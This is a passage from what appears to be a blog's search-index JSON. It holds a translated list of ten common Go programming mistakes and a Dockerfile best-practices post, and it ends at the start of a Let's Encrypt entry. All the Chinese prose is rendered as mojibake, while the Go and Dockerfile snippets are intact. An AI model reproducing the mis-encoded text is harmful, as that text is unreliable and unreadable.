ä¹æ²¡æœ‰åƒåœ¾å›æ”¶ã€‚æ­£å¦‚ä¸Šæ–‡æ‰€è¿°ï¼Œä¸€ä¸ªå˜é‡åˆ›å»ºå push åˆ° stack ä¸­ï¼Œå…¶å‡½æ•°è¿”å›ååˆ™ä» stack ä¸­ pop æ‰ã€‚å¯¹äºæœªä½¿ç”¨çš„å˜é‡æ— éœ€å¤æ‚çš„è¿‡ç¨‹æ¥å›æ”¶å®ƒä»¬ã€‚ stack ä»å±äºä¸€ä¸ª goroutine ï¼Œä¸ heap ç›¸æ¯”ï¼Œstack ä¸­çš„å˜é‡ä¸éœ€è¦åŒæ­¥ï¼Œè¿™ä¹Ÿå¯¼è‡´äº† stack æ€§èƒ½ä¸Šçš„ä¼˜åŠ¿ã€‚ æ€»ä¹‹ï¼Œå½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªå‡½æ•°æ—¶ï¼Œæˆ‘ä»¬çš„é»˜è®¤è¡Œä¸ºåº”è¯¥æ˜¯ä½¿ç”¨å€¼è€Œä¸æ˜¯æŒ‡é’ˆï¼Œåªæœ‰å½“æˆ‘ä»¬æƒ³ç”¨å…±äº«å˜é‡æ—¶æ‰åº”è¯¥ä½¿ç”¨æŒ‡é’ˆã€‚ å¦‚æœæˆ‘ä»¬é‡åˆ°æ€§èƒ½é—®é¢˜ï¼Œä¸€ç§å¯èƒ½çš„ä¼˜åŒ–å°±æ˜¯æ£€æŸ¥æŒ‡é’ˆåœ¨æŸäº›ç‰¹å®šæƒ…å†µä¸‹æ˜¯å¦æœ‰å¸®åŠ©ã€‚å¦‚æœä½ æƒ³è¦çŸ¥é“ç¼–è¯‘å™¨ä½•æ—¶å°†å˜é‡ escape åˆ° heap ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š go build -gcflags \"-m -m\" ","date":"2019-07-29","objectID":"/top-10-mistakes/:3:0","tags":["Golang"],"title":"Go å¼€å‘åç§å¸¸çŠ¯é”™è¯¯ã€è¯‘ã€‘","uri":"/top-10-mistakes/"},{"categories":["Golang"],"content":"4ã€ä» for/switch æˆ– for/select ä¸­ break ä¾‹å¦‚ï¼š for { switch f() { case true: break case false: // Do something } } for { select { case \u003c-ch: // Do something case \u003c-ctx.Done(): break } } æ³¨æ„ï¼Œbreak å°†ä¼šè·³å‡º switch æˆ– select ï¼Œä½†ä¸ä¼šè·³å‡º for å¾ªç¯ã€‚ ä¸ºäº†è·³å‡º for å¾ªç¯ï¼Œä¸€ç§è§£å†³æ–¹å¼æ˜¯ä½¿ç”¨å¸¦æ ‡ç­¾çš„ break ï¼š loop: for { select { case \u003c-ch: // Do something case \u003c-ctx.Done(): break loop } } ","date":"2019-07-29","objectID":"/top-10-mistakes/:4:0","tags":["Golang"],"title":"Go å¼€å‘åç§å¸¸çŠ¯é”™è¯¯ã€è¯‘ã€‘","uri":"/top-10-mistakes/"},{"categories":["Golang"],"content":"5ã€errors ç®¡ç† Go ä¸­çš„é”™è¯¯å¤„ç†ä¸€ç›´ä»¥æ¥é¢‡å…·äº‰è®®ã€‚ æ¨èä½¿ç”¨ https://github.com/pkg/errors åº“ï¼Œè¿™ä¸ªåº“éµå¾ªå¦‚ä¸‹è§„åˆ™ï¼š An error should be handled only once. Logging an error is handling an error. So an error should either be logged or propagated. è€Œå½“å‰çš„æ ‡å‡†åº“ï¼ˆåªæœ‰ä¸€ä¸ª New å‡½æ•°ï¼‰å´å¾ˆéš¾å»éµå¾ªè¿™ä¸€ç‚¹ï¼Œå› ä¸ºæˆ‘ä»¬å¯èƒ½å¸Œæœ›ä¸ºé”™è¯¯æ·»åŠ ä¸€äº›ä¸Šä¸‹æ–‡å¹¶å…·æœ‰æŸç§å½¢å¼çš„å±‚æ¬¡ç»“æ„ã€‚ å‡è®¾æˆ‘ä»¬åœ¨è°ƒç”¨æŸä¸ª REST è¯·æ±‚æ“ä½œæ•°æ®åº“æ—¶ä¼šç¢°åˆ°ä»¥ä¸‹é—®é¢˜ï¼š unable to server HTTP POST request for customer 1234 |_ unable to insert customer contract abcd |_ unable to commit transaction é€šè¿‡ä¸Šè¿° pkg/errors åº“ï¼Œæˆ‘ä»¬å¯ä»¥å¤„ç†å¦‚ä¸‹ï¼š func postHandler(customer Customer) Status { err := insert(customer.Contract) if err != nil { log.WithError(err).Errorf(\"unable to server HTTP POST request for customer %s\", customer.ID) return Status{ok: false} } return Status{ok: true} } func insert(contract Contract) error { err := dbQuery(contract) if err != nil { return errors.Wrapf(err, \"unable to insert customer contract %s\", contract.ID) } return nil } func dbQuery(contract Contract) error { // Do something then fail return errors.New(\"unable to commit transaction\") } æœ€åº•å±‚é€šè¿‡ errors.New åˆå§‹åŒ–ä¸€ä¸ª error ï¼Œä¸­é—´å±‚ insert å‡½æ•°å‘å…¶æ·»åŠ æ›´å¤šä¸Šä¸‹æ–‡ä¿¡æ¯æ¥åŒ…è£…æ­¤ error ï¼Œç„¶åçˆ¶çº§è°ƒç”¨è€…é€šè¿‡è®°å½•æ—¥å¿—æ¥å¤„ç†é”™è¯¯ï¼Œæ¯ä¸€å±‚éƒ½å¯¹é”™è¯¯è¿›è¡Œäº†è¿”å›æˆ–è€…å¤„ç†ã€‚ æˆ‘ä»¬å¯èƒ½è¿˜æƒ³æ£€æŸ¥é”™è¯¯åŸå› ä»¥è¿›è¡Œé‡è¯•ã€‚ä¾‹å¦‚æˆ‘ä»¬æœ‰ä¸€ä¸ªå¤–éƒ¨åº“ db å¤„ç†æ•°æ®åº“è®¿é—®ï¼Œå…¶å¯èƒ½ä¼šè¿”å›ä¸€ä¸ª db.DBError çš„é”™è¯¯ï¼Œä¸ºäº†å®ç°é‡è¯•ï¼Œæˆ‘ä»¬å¿…é¡»æ£€æŸ¥å…·ä½“çš„é”™è¯¯åŸå› ï¼š func postHandler(customer Customer) Status { err := insert(customer.Contract) if err != nil { switch errors.Cause(err).(type) { default: log.WithError(err).Errorf(\"unable to server HTTP POST request for customer %s\", customer.ID) return Status{ok: false} case *db.DBError: return retry(customer) } } return Status{ok: true} } func insert(contract Contract) error { err := db.dbQuery(contract) if err != nil { return errors.Wrapf(err, \"unable to insert customer contract %s\", contract.ID) } return nil } å¦‚ä¸Šæ‰€ç¤ºï¼Œé€šè¿‡ pkg/errors åº“çš„ errors.Cause å³å¯è½»æ¾å®ç°ã€‚ ä¸€ç§ç»å¸¸ä¼šçŠ¯çš„é”™è¯¯æ˜¯åªéƒ¨åˆ†ä½¿ç”¨ pkg/errors åº“ï¼Œä¾‹å¦‚ï¼š switch err.(type) { default: log.WithError(err).Errorf(\"unable to server HTTP POST request for customer %s\", customer.ID) return Status{ok: false} case *db.DBError: return retry(customer) } è¿™é‡Œç›´æ¥ä½¿ç”¨ err.(type) æ˜¯æ— æ³•æ•è·åˆ° db.DBError ç„¶åè¿›è¡Œé‡è¯•çš„ã€‚ ","date":"2019-07-29","objectID":"/top-10-mistakes/:5:0","tags":["Golang"],"title":"Go å¼€å‘åç§å¸¸çŠ¯é”™è¯¯ã€è¯‘ã€‘","uri":"/top-10-mistakes/"},{"categories":["Golang"],"content":"6ã€slice åˆå§‹åŒ– æœ‰æ—¶å€™æˆ‘ä»¬æ˜ç¡®çš„çŸ¥é“ä¸€ä¸ª slice åˆ‡ç‰‡çš„æœ€ç»ˆé•¿åº¦ã€‚ä¾‹å¦‚æˆ‘ä»¬æƒ³è¦å°†ä¸€ä¸ª Foo åˆ‡ç‰‡ convert ä¸º Bar åˆ‡ç‰‡ï¼Œè¿™æ„å‘³ç€ä¸¤ä¸ª slice åˆ‡ç‰‡çš„é•¿åº¦æ˜¯ç›¸åŒçš„ã€‚ ç„¶è€Œæœ‰äº›äººå´ç»å¸¸åˆå§‹åŒ– slice åˆ‡ç‰‡å¦‚ï¼š var bars []Bar bars := make([]Bar, 0) slice åˆ‡ç‰‡å¹¶ä¸æ˜¯ä¸€ä¸ªç¥å¥‡çš„ç»“æ„ï¼Œå½“æ²¡æœ‰æ›´å¤šå¯ç”¨ç©ºé—´æ—¶ï¼Œå®ƒä¼šè¿›è¡Œæ‰©å®¹ï¼Œä¹Ÿå°±æ˜¯å…¶å°†ä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªå…·æœ‰æ›´å¤§å®¹é‡çš„æ–°æ•°ç»„å¹¶å¤åˆ¶æ‰€æœ‰çš„å…ƒç´ ã€‚ ç°åœ¨ï¼Œè®©æˆ‘ä»¬æƒ³è±¡ä¸€ä¸‹å¦‚æœåˆ‡ç‰‡éœ€è¦å¤šæ¬¡æ‰©å®¹ï¼Œå³ä½¿æ—¶é—´å¤æ‚åº¦ä¿æŒä¸º O(1) ï¼Œä½†åœ¨å®è·µä¸­ï¼Œå®ƒä¹Ÿä¼šå¯¹æ€§èƒ½é€ æˆå½±å“ã€‚å°½å¯èƒ½é¿å…è¿™ç§æƒ…å†µã€‚ ","date":"2019-07-29","objectID":"/top-10-mistakes/:6:0","tags":["Golang"],"title":"Go å¼€å‘åç§å¸¸çŠ¯é”™è¯¯ã€è¯‘ã€‘","uri":"/top-10-mistakes/"},{"categories":["Golang"],"content":"7ã€context ç®¡ç† context.Context ç»å¸¸è¢«å¼€å‘è€…è¯¯è§£ã€‚å®˜æ–¹æ–‡æ¡£çš„æè¿°æ˜¯ï¼š A Context carries a deadline, a cancelation signal, and other values across API boundaries. è¿™ä¸ªæè¿°å¾ˆå®½æ³›ï¼Œä»¥è‡´äºä¸€äº›äººå¯¹ä¸ºä»€ä¹ˆä»¥åŠå¦‚ä½•ä½¿ç”¨å®ƒæ„Ÿåˆ°å›°æƒ‘ã€‚ è®©æˆ‘ä»¬è¯•ç€è¯¦ç»†è¯´æ˜ä¸‹ï¼Œä¸€ä¸ª context å¯ä»¥åŒ…å«ï¼š ä¸€ä¸ª deadline ã€‚å…¶å¯ä»¥æ˜¯æŒç»­æ—¶é—´ï¼ˆä¾‹å¦‚ 250 æ¯«ç§’ï¼‰æˆ–è€…å…·ä½“æŸä¸ªæ—¶é—´ç‚¹ï¼ˆä¾‹å¦‚ 2019-01-08 01:00:00ï¼‰ï¼Œä¸€æ—¦è¾¾åˆ° deadline åˆ™æ‰€æœ‰æ­£åœ¨è¿›è¡Œçš„æ´»åŠ¨éƒ½ä¼šå–æ¶ˆï¼ˆæ¯”å¦‚ I/O è¯·æ±‚ï¼Œç­‰å¾…æŸä¸ª channel è¾“å…¥ç­‰ç­‰ï¼‰ã€‚ ä¸€ä¸ªå–æ¶ˆ signal ä¿¡å·ï¼ˆåŸºæœ¬ä¸Šæ˜¯ \u003c-chan struct{} ï¼‰ã€‚è¿™é‡Œçš„è¡Œä¸ºæ˜¯ç±»ä¼¼çš„ï¼Œä¸€æ—¦æ”¶åˆ°å–æ¶ˆä¿¡å·åˆ™å¿…é¡»åœæ­¢æ­£åœ¨è¿›è¡Œä¸­çš„æ´»åŠ¨ã€‚ ä¸€ç»„ key/valueï¼ˆåŸºäº interface{} ç±»å‹ï¼‰ã€‚ éœ€è¦è¯´æ˜çš„æ˜¯ï¼Œä¸€ä¸ª context æ˜¯å¯ç»„åˆçš„ï¼Œä¾‹å¦‚æ—¢åŒ…å«ä¸€ä¸ª deadline åˆåŒ…å«ä¸€ç»„ key/value ã€‚æ­¤å¤–ï¼Œå¤šä¸ª goroutine å¯ä»¥å…±äº«åŒä¸€ä¸ª context ï¼Œå› æ­¤å–æ¶ˆä¿¡å·å¯èƒ½ä¼šå¯¼è‡´å¤šä¸ª goroutine ä¸­çš„æ´»åŠ¨è¢«åœæ­¢ã€‚ ä¾‹å¦‚ç”±åŒä¸€ä¸ª context å¼•å‘çš„è¿ç¯å–æ¶ˆï¼Œæˆ‘ä»¬è¦æ³¨æ„ä½¿ç”¨çˆ¶å­å½¢å¼çš„ context ï¼Œä»¥æ­¤æ¥åŒºåˆ†ç®¡ç†ï¼Œé¿å…ç›¸äº’å½±å“ã€‚ ","date":"2019-07-29","objectID":"/top-10-mistakes/:7:0","tags":["Golang"],"title":"Go å¼€å‘åç§å¸¸çŠ¯é”™è¯¯ã€è¯‘ã€‘","uri":"/top-10-mistakes/"},{"categories":["Golang"],"content":"8ã€æœªä½¿ç”¨ -race æµ‹è¯•æ—¶æœªä½¿ç”¨ -race é€‰é¡¹ä¹Ÿæ˜¯å¸¸è§çš„ï¼Œå®ƒæ˜¯æœ‰ä»·å€¼çš„å·¥å…·ï¼Œæˆ‘ä»¬åº”è¯¥åœ¨æµ‹è¯•æ—¶å§‹ç»ˆå¯åŠ¨å®ƒã€‚ ","date":"2019-07-29","objectID":"/top-10-mistakes/:8:0","tags":["Golang"],"title":"Go å¼€å‘åç§å¸¸çŠ¯é”™è¯¯ã€è¯‘ã€‘","uri":"/top-10-mistakes/"},{"categories":["Golang"],"content":"9ã€ä½¿ç”¨æ–‡ä»¶åä½œä¸ºè¾“å…¥ å‡è®¾æˆ‘ä»¬è¦å®ç°ä¸€ä¸ªå‡½æ•°å»ç»Ÿè®¡æ–‡ä»¶ä¸­çš„ç©ºè¡Œæ•°ï¼Œæˆ‘ä»¬å¯èƒ½è¿™æ ·åšï¼š func count(filename string) (int, error) { file, err := os.Open(filename) if err != nil { return 0, errors.Wrapf(err, \"unable to open %s\", filename) } defer file.Close() scanner := bufio.NewScanner(file) count := 0 for scanner.Scan() { if scanner.Text() == \"\" { count++ } } return count, nil } è¿™çœ‹èµ·æ¥å¾ˆè‡ªç„¶ï¼Œfilename æ–‡ä»¶åä½œä¸ºè¾“å…¥ï¼Œåœ¨å‡½æ•°å†…éƒ¨æ‰“å¼€æ–‡ä»¶ã€‚ ç„¶è€Œï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦å¯¹æ­¤å‡½æ•°è¿›è¡Œå•å…ƒæµ‹è¯•ï¼Œè¾“å…¥å¯èƒ½æ˜¯æ™®é€šæ–‡ä»¶ï¼Œæˆ–è€…ç©ºæ–‡ä»¶ï¼Œæˆ–è€…å…¶å®ƒä¸åŒç¼–ç ç±»å‹çš„æ–‡ä»¶ç­‰ç­‰ï¼Œæ­¤æ—¶åˆ™å¾ˆå®¹æ˜“å˜å¾—éš¾ä»¥ç®¡ç†ã€‚å¦å¤–ï¼Œå¦‚æœæˆ‘ä»¬æƒ³å¯¹æŸä¸ª HTTP body å®ç°ç›¸åŒçš„é€»è¾‘ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸å¾—ä¸åˆ›å»ºä¸€ä¸ªå¦å¤–çš„å‡½æ•°ã€‚ Go æä¾›äº†ä¸¤ä¸ªå¾ˆæ£’çš„æŠ½è±¡ï¼šio.Reader å’Œ io.Writer ã€‚æˆ‘ä»¬å¯ä»¥ä¼ é€’ io.Reader æŠ½è±¡æ•°æ®æºè€Œä¸æ˜¯ filename ã€‚è¿™æ ·ä¸ç®¡æ˜¯æ–‡ä»¶ä¹Ÿå¥½ï¼ŒHTTP body ä¹Ÿå¥½ï¼Œbyte buffer ä¹Ÿå¥½ï¼Œæˆ‘ä»¬éƒ½åªéœ€è¦ä½¿ç”¨ Read æ–¹æ³•å³å¯ã€‚ ä¸Šè¿°ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬ç”šè‡³å¯ä»¥ç¼“å†²è¾“å…¥ä»¥é€è¡Œè¯»å–ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ bufio.Reader å’Œå®ƒçš„ ReadLine æ–¹æ³•ï¼š func count(reader *bufio.Reader) (int, error) { count := 0 for { line, _, err := reader.ReadLine() if err != nil { switch err { default: return 0, errors.Wrapf(err, \"unable to read\") case io.EOF: return count, nil } } if len(line) == 0 { count++ } } } è€Œæ‰“å¼€æ–‡ä»¶çš„æ“ä½œåˆ™äº¤ç”± count çš„è°ƒç”¨è€…å»å®Œæˆï¼š file, err := os.Open(filename) if err != nil { return errors.Wrapf(err, \"unable to open %s\", filename) } defer file.Close() count, err := count(bufio.NewReader(file)) è¿™æ ·ï¼Œæ— è®ºæ•°æ®æºå¦‚ä½•æˆ‘ä»¬éƒ½å¯ä»¥è°ƒç”¨ count å‡½æ•°ï¼ŒåŒæ—¶è¿™æœ‰æœ‰åˆ©äºæˆ‘ä»¬è¿›è¡Œå•å…ƒæµ‹è¯•ï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥ç®€å•çš„ä»å­—ç¬¦ä¸²ä¸­åˆ›å»ºä¸€ä¸ª bufio.Reader : count, err := count(bufio.NewReader(strings.NewReader(\"input\"))) ","date":"2019-07-29","objectID":"/top-10-mistakes/:9:0","tags":["Golang"],"title":"Go å¼€å‘åç§å¸¸çŠ¯é”™è¯¯ã€è¯‘ã€‘","uri":"/top-10-mistakes/"},{"categories":["Golang"],"content":"10ã€Goroutines å’Œ Loop å¾ªç¯å˜é‡ ç¤ºä¾‹ï¼š ints := []int{1, 2, 3} for _, i := range ints { go func() { fmt.Printf(\"%v\\n\", i) }() } è¾“å‡ºå°†ä¼šæ˜¯ä»€ä¹ˆï¼Ÿ1 2 3 å—ï¼Ÿå½“ç„¶ä¸æ˜¯ã€‚ ä¸Šä¾‹ä¸­ï¼Œæ¯ä¸ª goroutine å…±äº«åŒä¸€ä¸ªå˜é‡å®ä¾‹ï¼Œå› æ­¤å°†ä¼šè¾“å‡º 3 3 3ï¼ˆæœ€æœ‰å¯èƒ½ï¼‰ã€‚ è¿™ä¸ªé—®é¢˜æœ‰ä¸¤ç§è§£å†³æ–¹å¼ã€‚ç¬¬ä¸€ç§æ˜¯å°† i å˜é‡ä¼ é€’ç»™ closure é—­åŒ…ï¼ˆ inner function ï¼‰ï¼š ints := []int{1, 2, 3} for _, i := range ints { go func(i int) { fmt.Printf(\"%v\\n\", i) }(i) } ç¬¬äºŒç§æ–¹å¼æ˜¯åœ¨ for å¾ªç¯èŒƒå›´å†…åˆ›å»ºå¦ä¸€ä¸ªå˜é‡ï¼š ints := []int{1, 2, 3} for _, i := range ints { i := i go func() { fmt.Printf(\"%v\\n\", i) }() } ä»¥ä¸Šå°±æ˜¯å…¨éƒ¨å†…å®¹ï¼Œç›¸å…³é—®é¢˜æ›´å¤šæ·±å…¥å†…å®¹å¯å‚è€ƒï¼š https://dave.cheney.net/high-performance-go-workshop/dotgo-paris.html?#watch_out_for_compiler_optimisations https://www.ardanlabs.com/blog/2017/05/language-mechanics-on-stacks-and-pointers.html https://www.youtube.com/watch?v=ZMZpH4yT7M0\u0026feature=youtu.be https://dave.cheney.net/2016/04/27/dont-just-check-errors-handle-them-gracefully http://p.agnihotry.com/post/understanding_the_context_package_in_golang/index.html https://medium.com/@val_deleplace/does-the-race-detector-catch-all-data-races-1afed51d57fb https://github.com/golang/go/wiki/CommonMistakes ","date":"2019-07-29","objectID":"/top-10-mistakes/:10:0","tags":["Golang"],"title":"Go å¼€å‘åç§å¸¸çŠ¯é”™è¯¯ã€è¯‘ã€‘","uri":"/top-10-mistakes/"},{"categories":["Kubernetes"],"content":"Dockerfile æœ€ä½³å®è·µ","date":"2019-07-10","objectID":"/dockerfile-best-practice/","tags":["Docker","Kubernetes"],"title":"Dockerfile æœ€ä½³å®è·µ","uri":"/dockerfile-best-practice/"},{"categories":["Kubernetes"],"content":"Dockerfile æ˜¯ç”¨æ¥æ„å»º docker é•œåƒçš„é…ç½®æ–‡ä»¶ï¼Œè¯­æ³•ç®€å•ä¸Šæ‰‹å®¹æ˜“ï¼Œä½ å¯ä»¥å¾ˆè½»æ¾çš„å°±ç¼–å†™ä¸€ä¸ªèƒ½æ­£å¸¸ä½¿ç”¨çš„ Dockerfile ï¼Œä½†æ˜¯å®ƒå¾ˆæœ‰å¯èƒ½è¿˜ä¸å¤Ÿå¥½ï¼Œæœ¬æ–‡å°†ä¼šä»ç»†èŠ‚ä¸Šä»‹ç»ä¸€äº› tips åŠ©ä½ å®ç°æœ€ä½³å®è·µã€‚ 1ã€æ³¨æ„æ„å»ºé¡ºåº FROM debian - COPY ../app RUN apt-get update RUN apt-get -y install cron vim ssh + COPY ../app ä¸Šä¾‹ä¸­ç¬¬äºŒæ­¥ä¸€æ—¦æœ¬åœ°æ–‡ä»¶å‘ç”Ÿäº†å˜åŒ–å°†ä¼šå¯¼è‡´åŒ…æ‹¬æ­¤åæ­¥éª¤çš„ç¼“å­˜å…¨éƒ¨å¤±æ•ˆï¼Œå¿…é¡»é‡æ–°æ„å»ºï¼Œå°¤å…¶æ˜¯åœ¨å¼€å‘ç¯å¢ƒï¼Œè¿™å°†ä¼šå¢åŠ ä½ æ„å»ºé•œåƒçš„è€—æ—¶ã€‚æ„å»ºæ­¥éª¤çš„æ’åºå¾ˆé‡è¦ï¼Œæ”¹å˜å°çš„æ­¥éª¤æ”¾å‰é¢ï¼Œæ”¹å˜å¤§çš„æ­¥éª¤æ”¾åé¢ï¼Œè¿™æœ‰åŠ©äºä½ ä¼˜åŒ–ä½¿ç”¨ç¼“å­˜åŠ é€Ÿæ•´ä¸ªæ„å»ºè¿‡ç¨‹ã€‚ 2ã€ä½¿ç”¨æ›´ç²¾ç¡®çš„ COPY åª copy çœŸæ­£éœ€è¦çš„æ–‡ä»¶ï¼Œæ¯”å¦‚ node_modules æˆ–è€…å…¶å®ƒä¸€äº›å¯¹äºæ„å»ºé•œåƒæ¯«æ— ä½œç”¨çš„æ–‡ä»¶ä¸€å®šè¦å¿½ç•¥æ‰ï¼ˆå†™å…¥ .dockerignore æ–‡ä»¶ï¼‰ï¼Œè¿™äº›æ— ç”¨çš„æ–‡ä»¶ç™¾å®³è€Œæ— ä¸€åˆ©ã€‚ 3ã€åˆå¹¶æŒ‡ä»¤ - RUN apt-get update - RUN apt-get -y install cron vim ssh + RUN apt-get update \u0026\u0026 apt-get -y install cron vim ssh åƒè¿™ç§ apt-get å‡çº§å’Œå®‰è£…åˆ†ä¸ºä¸¤ä¸ªæ­¥éª¤æ¯«æ— å¿…è¦ï¼Œåä¹‹ç»Ÿä¸€ä¸ºä¸€ä¸ªæ­¥éª¤æ›´æœ‰åˆ©äºç¼“å­˜ã€‚ä½ å¦‚æœä»”ç»†è§‚å¯Ÿå„ç§å®˜æ–¹é•œåƒçš„ Dockerfile æ˜¯æ€ä¹ˆå†™çš„ï¼Œä½ è‚¯å®šä¼šå‘ç°ä»–ä»¬å•æ¡ RUN æŒ‡ä»¤çš„å†…å®¹ç›¸å½“çš„å†—é•¿ä¹Ÿä¸ä¼šæ‹†åˆ†ï¼Œè¿™æ ·å†™æ˜¯æœ‰é“ç†çš„ã€‚ 4ã€ç§»é™¤ä¸å¿…è¦çš„ä¾èµ– - RUN apt-get update \u0026\u0026 apt-get -y install cron vim ssh + RUN apt-get update \u0026\u0026 apt-get -y install --no-install-recommends cron åªå®‰è£…å¿…é¡»çš„ä¾èµ–ï¼ŒæŸäº› debug çš„å·¥å…·ä¸è¦åœ¨æ„å»ºçš„æ—¶å€™å®‰è£…ï¼Œé¦–å…ˆçº¿ä¸Š debug çš„é¢‘ç‡åº”è¯¥æ˜¯å¾ˆä½çš„ï¼Œå…¶æ¬¡çœŸçš„è¦ç”¨çš„æ—¶å€™å¦å¤–å†å®‰è£…å°±å¥½äº†ã€‚å¦å¤– apt-get è¿™ç§åŒ…ç®¡ç†å™¨å¯èƒ½ä¼šå¤šå®‰è£…ä¸€äº›é¢å¤–æ¨èçš„ä¸œè¥¿ï¼ŒåŠ ä¸Š --no-install-recommends ä¸è¦å®‰è£…å®ƒä»¬ï¼Œå¦‚æœæŸäº›å·¥å…·æ˜¯éœ€è¦çš„åˆ™å¿…é¡»æ˜¾ç¤ºå£°æ˜ã€‚ 5ã€ç§»é™¤åŒ…ç®¡ç†å™¨çš„ç¼“å­˜ RUN apt-get update \\ \u0026\u0026 apt-get -y install --no-install-recommends cron \\ + \u0026\u0026 rm -rf /var/lib/apt/lists/* åŒ…ç®¡ç†å™¨æœ‰å®ƒè‡ªå·±çš„ç¼“å­˜ï¼Œè®°å¾—åˆ é™¤è¿™äº›æ–‡ä»¶ã€‚åšè¿™ä¹ˆå¤šçš„ç›®çš„å…¶å®å°±æ˜¯ç²¾ç®€é•œåƒçš„å¤§å°ï¼ˆä¸€ä¸ªé•œåƒå‡ ç™¾M ä¸ŠGçš„å®åœ¨æ˜¯æœ‰å¤ªå¤šä¸éœ€è¦çš„åƒåœ¾å†…å®¹äº†ï¼‰ï¼Œé•œåƒè¶Šå°éƒ¨ç½²èµ·æ¥è¶Šå¿«ã€‚ 6ã€ä½¿ç”¨å®˜æ–¹é•œåƒ æ¯”å¦‚ï¼Œä½ éœ€è¦ä¸€ä¸ª node.js ç¯å¢ƒï¼Œä½ å¯ä»¥æ‹‰å–ä¸€ä¸ª linux åŸºç¡€é•œåƒï¼Œç„¶åè‡ªå·±ä¸€æ­¥ä¸€æ­¥å®‰è£…ï¼Œä½†æ˜¯è¿™æ ·åšæ¯«æ— å¿…è¦ï¼Œä½ åº”è¯¥ç›´æ¥é€‰æ‹© node.js å®˜æ–¹çš„åŸºç¡€é•œåƒï¼Œä½ è¦çŸ¥é“å®˜æ–¹é•œåƒä¸€å®šæ˜¯åšäº†å¾ˆå¤šä¼˜åŒ–çš„ã€‚ 7ã€ä½¿ç”¨æ¸…æ™°çš„ tag æ ‡è®° ä¸è¦ä½¿ç”¨ FROM node:latest è¿™ç§ï¼Œlatest æ ‡è®°é¬¼çŸ¥é“å…·ä½“æŒ‡å‘äº†å“ªä¸ªç‰ˆæœ¬ã€‚ 8ã€å¯»æ‰¾åˆé€‚å¤§å°çš„é•œåƒ 12.6.0-stretch 349MB 12.6.0-slim 56MB 12.6.0-alpine 27MB ä¾‹å¦‚ä¸Šé¢è¿™ä¸‰ä¸ªåŸºç¡€é•œåƒéƒ½æ˜¯ç›¸åŒçš„ node 12.6.0 ç‰ˆæœ¬ï¼Œä½†æ˜¯é•œåƒå¤§å°å·®åˆ«å´å¾ˆå¤§ï¼Œå› ä¸ºåº•å±‚çš„ç³»ç»Ÿæ˜¯å¯ä»¥è¢«è£å‰ªçš„ï¼Œé•œåƒè¶Šå°è¶Šå¥½ï¼Œä½†æ˜¯è¦æ³¨æ„ç”±äºç³»ç»Ÿè¢«è£å‰ªå¯èƒ½å‡ºç°å…¼å®¹æ€§é—®é¢˜ã€‚ 9ã€åœ¨ä¸€è‡´çš„ç¯å¢ƒä¸­ä»æºç æ„å»º 10ã€å®‰è£…ä¾èµ– è¿™é‡Œå®‰è£…çš„ä¾èµ–æŒ‡çš„ä¸æ˜¯ç³»ç»Ÿä¾èµ–ï¼Œè€Œæ˜¯åº”ç”¨ç¨‹åºçš„ä¾èµ–ï¼Œåœ¨å•ç‹¬çš„æ­¥éª¤ä¸­è¿›è¡Œã€‚ 11ã€å¤šé˜¶æ®µæ„å»º ä¾‹å¦‚ go è¯­è¨€ï¼Œæ‰“åŒ…ç¼–è¯‘çš„æ“ä½œæ˜¯éœ€è¦å®‰è£…ç›¸å…³ç¯å¢ƒå’Œå·¥å…·çš„ï¼Œä½†æ˜¯è¿è¡Œçš„æ—¶å€™å¹¶ä¸éœ€è¦ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨å¤šé˜¶æ®µæ„å»ºã€‚ FROM golang:1.12 AS builder WORKDIR /app COPY ./ ./ RUN go build -o myapp test.go FROM debian:stable-slim COPY --from=builder /app/myapp / CMD [\"./myapp\"] å¦‚ä¸Šæ‰€ç¤ºï¼Œæˆ‘ä»¬åœ¨ç¬¬ä¸€é˜¶æ®µçš„æ„å»ºæ‹‰å–äº†å®Œæ•´çš„ go ç¯å¢ƒï¼Œç„¶åæ‰“åŒ…ç¼–è¯‘ç”ŸæˆäºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶ï¼Œåœ¨ç¬¬äºŒé˜¶æ®µåˆ™é‡æ–°æ„é€ ä¸€ä¸ªæ–°çš„ç¯å¢ƒå¹¶é€‰ç”¨ç²¾ç®€çš„ debian åŸºç¡€é•œåƒï¼ŒåªæŠŠç¬¬ä¸€é˜¶æ®µç¼–è¯‘å¥½çš„å¯æ‰§è¡Œæ–‡ä»¶å¤åˆ¶è¿›æ¥ï¼Œè€Œå…¶å®ƒä¸éœ€è¦çš„ä¸œè¥¿é€šé€šæŠ›å¼ƒæ‰äº†ï¼Œè¿™æ ·æˆ‘ä»¬æœ€ç»ˆç”Ÿæˆçš„é•œåƒæ˜¯éå¸¸å°è€Œç²¾çš„ã€‚ï¼ˆå¤šé˜¶æ®µæ„å»ºè¦æ±‚ docker ç‰ˆæœ¬ 17.05 ä»¥ä¸Šï¼‰ æœ€åï¼Œæˆ‘ä»¬æ‰€ä½¿ç”¨çš„è¯­è¨€å’Œå¯¹ç¯å¢ƒçš„è¦æ±‚åƒå·®ä¸‡åˆ«ï¼Œæ³¨æ„ä¸è¦ç”Ÿæ¬ç¡¬å¥—ï¼Œåªæœ‰é€‚åˆè‡ªå·±çš„æ‰æ˜¯æœ€å¥½çš„ï¼Œå¸Œæœ›æœ¬æ–‡æ‰€è¿°çš„è¿™äº›ç»†èŠ‚å¯¹ä½ æœ‰æ‰€å¸®åŠ©ã€‚ ","date":"2019-07-10","objectID":"/dockerfile-best-practice/:0:0","tags":["Docker","Kubernetes"],"title":"Dockerfile æœ€ä½³å®è·µ","uri":"/dockerfile-best-practice/"},{"categories":["Uncate"],"content":"Let's Encrypt é…ç½® HTTPS å…è´¹æ³›åŸŸåè¯ä¹¦","date":"2019-06-27","objectID":"/lets-encrypt/","tags":[],"title":"Let's Encrypt é…ç½® HTTPS å…è´¹æ³›åŸŸåè¯ä¹¦","uri":"/lets-encrypt/"},{"categories":["Uncate"],"content":"æƒ³è¦ä½¿ç”¨ HTTPS ï¼Œä½ 